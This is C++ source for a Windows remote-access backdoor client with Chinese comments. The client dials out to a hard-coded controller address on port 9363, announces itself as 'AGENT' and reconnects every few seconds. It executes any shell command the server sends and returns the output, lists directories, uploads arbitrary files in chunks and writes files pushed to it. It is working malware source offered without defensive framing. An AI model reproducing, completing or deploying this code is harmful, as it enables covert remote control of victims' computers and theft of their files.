#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <chrono>
#include <filesystem>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <array>
#include <string>
#include <Shlwapi.h> 
#include <fstream>
#include <vector>
#include <cstring> 
#include <algorithm>
#include <chrono>
#include <iconv.h>
#include <thread>
#include <thread>
#define OPENSSL_SUPPRESS_DEPRECATED
#include "openssl/md5.h"
#undef OPENSSL_SUPPRESS_DEPRECATED

#include <fstream>
#include <map>
#define CHUNK_SIZE 1024*64
using namespace std;
namespace fs = std::filesystem;


#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024*512
#define DEFAULT_PORT "9363"
#define RECONNECT_DELAY 5000 // 重连延迟时间（毫秒）
const std::string FILE_LIST_REQUEST_PREFIX = "LIST:";
const std::string MESSAGE_PREFIX = "MSG:";
const std::string COMMAND_PREFIX = "SHELL:";
const std::string FILE_PREFIX = "FILE:";
const std::string isFILE_PREFIX = "isFile";
const std::string isFILE_END_PREFIX = "Transfer_File_end";

bool sendMessage(int sock, const std::string& message) {
    int sentBytes = send(sock, message.c_str(), message.length(), 0);
    if (sentBytes < 0) {
        std::cerr << "Failed to send message." << std::endl;
        return false;
    }
    return true;
}

string Listdirectory(const std::string& directory_path) {
    try {
        if (fs::exists(directory_path) && fs::is_directory(directory_path)) {
            string output_info;
            for (const auto& entry : fs::directory_iterator(directory_path)) {
                const auto filenamestr = entry.path().filename().string();
                if (entry.is_directory()) {
                    output_info += "[dir]  " + filenamestr + "\n";
                }
                else if (entry.is_regular_file()) {
                    output_info += "[file] " + filenamestr + "\n";
                }
                else {
                    output_info += "[other] " + filenamestr + "\n";
                }
            }
            return output_info;
        }
        else {
            std::cout << "path does not exist or is not a directory." << std::endl;
        }
    }
    catch (const fs::filesystem_error& err) {
        std::cerr << "filesystem error: " << err.what() << std::endl;
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }
    return 0;
}

string execCommand(const std::string& cmd) {
    std::array<char, 128> buffer;
    std::string result;
    // 使用popen创建一个管道，执行一个命令，并读取输出
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
    //std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    std::cout << "Commadn result: " << result << std::endl;
    return result;
}

string getExecutablePath() {
    char buffer[MAX_PATH];
    DWORD ret = GetModuleFileNameA(NULL, buffer, MAX_PATH);
    if (ret == 0) {
        return std::string(); // 或者抛出异常
    }
    PathRemoveFileSpecA(buffer);
    return std::string(buffer);

}

vector<char> readFile(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file) {
        throw std::runtime_error("Cannot open file: " + filePath + " Error: " + std::strerror(errno));
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<char> buffer(size);
    if (!file.read(buffer.data(), size)) {
        throw std::runtime_error("Cannot read file: " + filePath);
    }

    return buffer;
}

bool sendAll(int socket, const void* buffer, size_t length) {
    const char* ptr = (const char*)buffer;
    while (length > 0) {
        int i = send(socket, ptr, length, 0);
        if (i < 1) return false; // 发送失败，或者连接关闭
        ptr += i;
        length -= i;
    }
    return true;
}


void sendFileOverNetwork(int ConnectSocket, const std::vector<char>& fileData) {
    // 首先，发送文件大小
    int fileSize = fileData.size();
    if (!sendAll(ConnectSocket, &fileSize, sizeof(fileSize))) {
        throw std::runtime_error("Failed to send file size");
    }

    // 接着，发送文件内容
    if (!sendAll(ConnectSocket, fileData.data(), fileData.size())) {
        throw std::runtime_error("Failed to send file data");
    }
}

enum class MessageType {
    Text,
    Binary,
    FilePath,
    FileList,
    Command,
    END,
    FIleSize
};

struct Message {
    MessageType type;
    uint32_t chunk_id; // 块编号
    uint32_t length; // 消息内容的长度
    std::vector<char> data; // 消息内容
    std::string filename; // 文件名
    uint32_t filenameLength = filename.size();
    unsigned char checksum[MD5_DIGEST_LENGTH]; // MD5校验和
    int filesize;
    // 计算MD5校验和
    void calculateChecksum() {
        MD5(reinterpret_cast<const unsigned char*>(data.data()), data.size(), checksum);
    }
    std::vector<char> serialize() const {
        std::vector<char> result;
        result.push_back(static_cast<char>(type));
     
        result.insert(result.end(), reinterpret_cast<const char*>(&chunk_id), reinterpret_cast<const char*>(&chunk_id) + sizeof(chunk_id));
        result.insert(result.end(), reinterpret_cast<const char*>(&filenameLength), reinterpret_cast<const char*>(&filenameLength) + sizeof(filenameLength));
        result.insert(result.end(), filename.begin(), filename.end());
        result.insert(result.end(), reinterpret_cast<const char*>(&length), reinterpret_cast<const char*>(&length) + sizeof(length));
        result.insert(result.end(), data.begin(), data.end());

        result.insert(result.end(), reinterpret_cast<const char*>(&filesize), reinterpret_cast<const char*>(&filesize) + sizeof(filesize));
        result.insert(result.end(), reinterpret_cast<const char*>(checksum), reinterpret_cast<const char*>(checksum) + MD5_DIGEST_LENGTH);
        return result;
    }
    // 从字节流中反序列化出Message对象
    static Message deserialize(const std::vector<char>& bytes) {
        Message msg;
        int offset = 0;
        msg.type = static_cast<MessageType>(bytes[offset]);
        offset += 1;

        std::memcpy(&msg.chunk_id, &bytes[offset], sizeof(msg.chunk_id));
        offset += sizeof(msg.chunk_id);

        std::memcpy(&msg.filenameLength, &bytes[offset], sizeof(msg.filenameLength));
        offset += sizeof(msg.filenameLength);

        msg.filename = std::string(bytes.begin() + offset, bytes.begin() + offset + msg.filenameLength);
        offset += msg.filenameLength;

        std::memcpy(&msg.length, &bytes[offset], sizeof(msg.length));
        offset += sizeof(msg.length);

        msg.data = std::vector<char>(bytes.begin() + offset, bytes.begin() + offset + msg.length);
        offset += msg.length;

        std::memcpy(&msg.filesize, &bytes[offset], sizeof(msg.filesize));
        offset += sizeof(msg.filesize);

        std::memcpy(msg.checksum, &bytes[offset], MD5_DIGEST_LENGTH);

        return msg;
    }

    // 验证校验和
    bool validateChecksum() const {
        unsigned char computed_checksum[MD5_DIGEST_LENGTH];
        MD5(reinterpret_cast<const unsigned char*>(data.data()), data.size(), computed_checksum);
        return std::memcmp(computed_checksum, checksum, MD5_DIGEST_LENGTH) == 0;
    }
};

std::string utf8ToGbk(const std::string& utf8Str) {
    // Convert UTF-8 to wide string (UTF-16)
    int wideCharLen = MultiByteToWideChar(CP_UTF8, 0, utf8Str.c_str(), -1, nullptr, 0);
    if (wideCharLen == 0) {
        throw std::runtime_error("MultiByteToWideChar failed");
    }

    std::vector<wchar_t> wideStr(wideCharLen);
    if (MultiByteToWideChar(CP_UTF8, 0, utf8Str.c_str(), -1, wideStr.data(), wideCharLen) == 0) {
        throw std::runtime_error("MultiByteToWideChar failed");
    }

    // Convert wide string (UTF-16) to GBK
    int gbkLen = WideCharToMultiByte(CP_ACP, 0, wideStr.data(), -1, nullptr, 0, nullptr, nullptr);
    if (gbkLen == 0) {
        throw std::runtime_error("WideCharToMultiByte failed");
    }

    std::vector<char> gbkStr(gbkLen);
    if (WideCharToMultiByte(CP_ACP, 0, wideStr.data(), -1, gbkStr.data(), gbkLen, nullptr, nullptr) == 0) {
        throw std::runtime_error("WideCharToMultiByte failed");
    }

    return std::string(gbkStr.data());
}


int main() {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL, * ptr = NULL, hints;
    char recvbuf[DEFAULT_BUFLEN];
    double recvbuflen = DEFAULT_BUFLEN;

    // 初始化Winsock
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        std::cout << "WSAStartup failed: " << iResult << std::endl;
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    bool isFile=false;

    string filename = "";
    std::vector<char> buffer;
    int filesize=0 ;
    int data_size=0;

   
    while (true) { // 主循环 - 持续尝试连接和接收数据
        // 解析服务器地址和端口
        //iResult = getaddrinfo("114.55.0.23", DEFAULT_PORT, &hints, &result);
        iResult = getaddrinfo("192.168.52.132", DEFAULT_PORT, &hints, &result);

        if (iResult != 0) {
            std::cout << "getaddrinfo failed: " << iResult << std::endl;
            WSACleanup();
            return 1;
        }

        // 尝试连接到服务器
        for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
            // 创建套接字
            ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
            if (ConnectSocket == INVALID_SOCKET) {
                std::cout << "socket failed: " << WSAGetLastError() << std::endl;
                WSACleanup();
                return 1;
            }

            // 连接到服务器
            iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
            if (iResult == SOCKET_ERROR) {
                closesocket(ConnectSocket);
                ConnectSocket = INVALID_SOCKET;
                continue;
            }
            break;
        }

        freeaddrinfo(result);
        if (ConnectSocket == INVALID_SOCKET) {
            std::cout << "Unable to connect to server, will try again in " << RECONNECT_DELAY << "ms" << std::endl;
            std::this_thread::sleep_for(std::chrono::milliseconds(RECONNECT_DELAY));
            continue;
        }
        std::cout << "Connection successfully,Wait Messages" << std::endl;
        // 连接建立后，立即发送"AGENT"标识
        if (!sendMessage(ConnectSocket, "AGENT")) {
            closesocket(ConnectSocket);
            return -1;
        }
 
        // 接收数据循环
        while (true) {
            iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
            if (iResult > 0) {
                std::cout << "Bytes received: " << iResult << std::endl;
                //string message = std::string(recvbuf, 0, iResult);
                std::string utf8Message(recvbuf, 0,iResult);
                std::string message = utf8ToGbk(utf8Message);
             /*   if (iResult<1024*32) {
                    std::cout << "Message: " << message << std::endl;
                }*/
                if (isFile) {
                    data_size += iResult;
                    buffer.insert(buffer.end(), recvbuf, recvbuf + iResult);
                    std::cout << "data_size: " << data_size << endl;

                }
                if (data_size >= filesize && data_size!=0 &&filesize!=0) {
                    isFile = false;
                    data_size = 0;
                }
                if (message.compare(0, isFILE_PREFIX.length(), isFILE_PREFIX) == 0) {
                    isFile = true;
                    string recv_mess = message.substr(isFILE_PREFIX.length());
                    size_t delimiterPos = recv_mess.find('|');
                    if (delimiterPos != std::string::npos) {
                        filename = recv_mess.substr(0, delimiterPos);
                        std::string rightPart = recv_mess.substr(delimiterPos + 1);
                        try {
                            filesize = std::stoi(rightPart);
                        }
                        catch (const std::invalid_argument& e) {
                            std::cerr << "Invalid argument: " << e.what() << std::endl;
                            return 1;
                        }
                        catch (const std::out_of_range& e) {
                            std::cerr << "Out of range: " << e.what() << std::endl;
                            return 1;
                        }
                    }
                    else {
                        std::cerr << "Delimiter '|' not found in the input string." << std::endl;
                    }
                    std::cout << "isFile "<<filename<<" | "<< filesize << endl;
                }
                
                if (message.compare(0, isFILE_END_PREFIX.length(), isFILE_END_PREFIX) == 0) {
                    
                    // 当所有的数据都接收完毕后，打开一个文件并写入数据
                    std::ofstream file(filename, std::ios::binary);
                    if (!file) {
                        std::cerr << "Could not open file for writing." << std::endl;
                        return 1;
                    }
                    
                    file.write(buffer.data(), buffer.size());
                    if (!file) {
                        std::cerr << "Error occurred when writing to file." << std::endl;
                        return 1;
                    }
                    std::cout << "文件传输完毕！！ " << buffer.size() << endl;
                    buffer.clear();
                }

                if (message.compare(0, FILE_LIST_REQUEST_PREFIX.length(), FILE_LIST_REQUEST_PREFIX) == 0) {
                    // 处理文件列表请求
                    Message message_;
                    string directory_path = message.substr(FILE_LIST_REQUEST_PREFIX.length());
                    string files_message;
                    std::cout << "directory_path: " << directory_path << std::endl;
                    if (directory_path.length() == 0) {
                        directory_path = getExecutablePath();
                        std::cout << "Executable Path: " << directory_path << std::endl;
                    }
                    files_message = directory_path+Listdirectory(directory_path);

                    message_.type = MessageType::FileList;
                    message_.data = std::vector<char>(files_message.begin(), files_message.end());
                    message_.length = message_.data.size();
                    message_.filesize = message_.data.size();
                    auto serializedMsg = message_.serialize();
                    send(ConnectSocket, serializedMsg.data(), serializedMsg.size(), 0);
                    std::cout << "file size: " << message_.data.size() << " |serialized.size() " << serializedMsg.size() << endl;
          
                }
                if (message.compare(0, COMMAND_PREFIX.length(), COMMAND_PREFIX) == 0) {
                    Message message_;
                    string CC = message.substr(COMMAND_PREFIX.length());
                    string files_message = execCommand(CC);
                    std::cout << "Command done~ " << files_message.size() << std::endl;
                    message_.type = MessageType::Command;
                    message_.data = std::vector<char>(files_message.begin(), files_message.end());
                    message_.length = message_.data.size();

                    auto serializedMsg = message_.serialize();
                    send(ConnectSocket, serializedMsg.data(), serializedMsg.size(), 0);
         
                }
                if (message.compare(0, FILE_PREFIX.length(), FILE_PREFIX) == 0) {
                     Message message_;
                    string CC = message.substr(FILE_PREFIX.length());
                    std::cout << "File done~ " << CC << std::endl;
    /*                message_.filename = "mm";
                    message_.type = MessageType::Binary;
                    message_.data = std::vector<char>(files_message.begin(), files_message.end());
                    message_.length = message_.data.size();
                    auto serializedMsg = message_.serialize();
                    send(ConnectSocket, serializedMsg.data(), serializedMsg.size(), 0);*/
                 
    /*                message_.filename = std::string(CC);
                    message_.filenameLength = message_.filename.size();*/
                    std::ifstream file(CC, std::ios::in | std::ios::binary);
                    ifstream file_(CC, std::ios::binary | std::ios::ate);
                    std::streamsize size = file_.tellg();
                    std::cout << "file size:" << size << endl;
                    Message pre_message;
                    pre_message.type = MessageType::FIleSize;
                    pre_message.filesize = size;
                    pre_message.length = 0;
                    auto pre_serializedMsg = pre_message.serialize();

                    send(ConnectSocket, pre_serializedMsg.data(), pre_serializedMsg.size(), 0);
                    int chunk_id = 0;
                    while (!file.eof()) {
                        message_.type = MessageType::Binary;

                        message_.chunk_id = chunk_id++;
                        message_.data.resize(CHUNK_SIZE);
                        file.read(message_.data.data(), CHUNK_SIZE);
                        cout << "file.gcount(): " << file.gcount()<<endl;
                        message_.length = file.gcount();
                        message_.data.resize(message_.length);
                        //message_.calculateChecksum();
        
                        auto serialized = message_.serialize();
                        int ss = serialized.size();
                        /*Message pre_message;
                        pre_message.type = MessageType::FIleSize;

                        pre_message.filesize = serialized.size();
                        pre_message.length = 0;
                        auto pre_serializedMsg = pre_message.serialize();
                      
                        send(ConnectSocket, pre_serializedMsg.data(), pre_serializedMsg.size(), 0);*/
                        std::this_thread::sleep_for(std::chrono::milliseconds(80));

                        send(ConnectSocket, message_.data.data(), message_.data.size(), 0);
                        cout << "file size: " << message_.data.size() <<" |serialized.size() "<< serialized.size() <<" | pre_serializedMsg.size()"<< pre_serializedMsg.size() << endl;
                   
                    }
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    std::cout << "结束发送" << endl;
                    // 发送结束消息
                    message_.type = MessageType::END;
                    message_.chunk_id = chunk_id;
                    message_.data.clear();
                    message_.length = 0;

                    std::vector<char> serialized_end = message_.serialize();
                    send(ConnectSocket, serialized_end.data(), serialized_end.size(), 0);

                    std::cout << "File sent successfully" << std::endl;
                    file.close();
                }
        /*        else {
                    string mm = "Agent sent:"+message;
                    message_.type = MessageType::Text;
                    message_.data = std::vector<char>(mm.begin(), mm.end());
                    message_.length = message_.data.size();
                    auto serializedMsg = message_.serialize();
                    send(ConnectSocket, serializedMsg.data(), serializedMsg.size(), 0);
                }*/
            }
            else if (iResult == 0) {
                std::cout << "Connection closed" << std::endl;
                break; // 结束接收和发送循环，关闭套接字
            }
            else {
                std::cout << "recv failed: " << WSAGetLastError() << std::endl;
                break; // 结束接收和发送循环，关闭套接字
            }
            // 可以在这里添加延时以限制消息的回发速度，如果需要的话
        }
        // 关闭套接字
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET; // 重置套接字

        // 等待一段时间后重试连接
        std::cout << "Will try to reconnect in " << RECONNECT_DELAY << "ms" << std::endl;
        std::this_thread::sleep_for(std::chrono::milliseconds(RECONNECT_DELAY));
    }

    // 清理Winsock
    WSACleanup();

    return 0;
}
